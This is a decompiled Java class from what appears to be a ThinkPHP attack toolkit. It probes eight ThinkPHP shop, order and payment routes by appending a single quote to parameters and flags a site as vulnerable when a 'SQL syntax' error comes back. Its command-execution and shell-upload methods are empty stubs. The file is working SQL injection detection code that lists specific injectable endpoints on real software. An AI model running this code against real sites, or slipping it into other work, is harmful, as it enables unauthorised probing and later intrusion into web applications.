/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp_multi_sql_leak
/*    */   implements BaseExp {
/* 10 */   private String results = null;
/* 11 */   private final HashMap<String, String> property = new HashMap<>();
/* 12 */   private final String[] paths = new String[] { "/index.php?s=/home/shopcart/getPricetotal/tag/1%27", "/index.php?s=/home/shopcart/getpriceNum/id/1%27", "/index.php?s=/home/user/cut/id/1%27", "/index.php?s=/home/service/index/id/1%27", "/index.php?s=/home/pay/chongzhi/orderid/1%27", "/index.php?s=/home/order/complete/id/1%27", "/index.php?s=/home/order/detail/id/1%27", "/index.php?s=/home/order/cancel/id/1%27" };
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 25 */     for (String path : this.paths) {
/* 26 */       Response response = HttpTool.get(url + path, this.property);
/* 27 */       if (response.getText().contains("SQL syntax")) {
/* 28 */         this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 29 */         return this.results;
/*    */       } 
/* 31 */       if (response.getError() != null) {
/* 32 */         this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 33 */         return this.results;
/*    */       } 
/*    */     } 
/*    */     
/* 37 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 38 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 43 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 48 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_multi_sql_leak.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */